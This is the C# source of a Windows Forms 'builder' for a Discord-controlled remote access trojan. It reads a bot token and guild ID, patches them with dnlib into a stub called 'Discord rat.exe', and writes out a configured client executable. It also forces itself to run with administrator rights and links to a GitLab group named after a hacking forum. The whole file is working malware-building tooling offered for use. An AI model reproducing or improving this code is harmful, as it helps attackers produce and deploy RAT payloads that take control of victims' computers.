using dnlib.DotNet;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Security.Principal;

namespace builder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent())
         .IsInRole(WindowsBuiltInRole.Administrator))
            {
                try
                {
                    var exePath = Process.GetCurrentProcess().MainModule.FileName;

                    Process.Start(new ProcessStartInfo(exePath)
                    {
                        UseShellExecute = true,
                        Verb = "runas"
                    });
                }
                catch
                {
                    // User cancelled UAC prompt
                }

                Environment.Exit(0);
            }
            InitializeComponent();
           
        }

        private void label1_Click(object sender, EventArgs e)
        {
            
        }
        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("https://gitlab.com/xss_is-group")
                {
                    UseShellExecute = true
                });
            }
            catch
            {
                MessageBox.Show("Error");
            }

        }
        private void button1_Click(object sender, EventArgs e)
        {
            string Bottoken = textBox1.Text;
            string Guildid = textBox2.Text;
            string outpath = Environment.CurrentDirectory + "\\Client-built.exe";
            string stub = Environment.CurrentDirectory + "\\Release" + "\\Discord rat.exe";
            string FullName = "Discord_rat.settings";
            var Assembly = AssemblyDef.Load(stub);
            var Module = Assembly.ManifestModule;
            if (Module != null)
            {
                var Settings = Module.GetTypes().Where(type => type.FullName == FullName).FirstOrDefault();
                if (Settings != null)
                {
                    var Constructor = Settings.FindMethod(".cctor");
                    if (Constructor != null)
                    {
                        Constructor.Body.Instructions[0].Operand = Bottoken;
                        Constructor.Body.Instructions[2].Operand = Guildid;
                        try
                        {
                            Assembly.Write(outpath);
                            MessageBox.Show("built to: " + outpath);
                        }
                        catch (Exception b)
                        {
                            MessageBox.Show("ERROR: " + b);
                        }
                    }
                }
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}
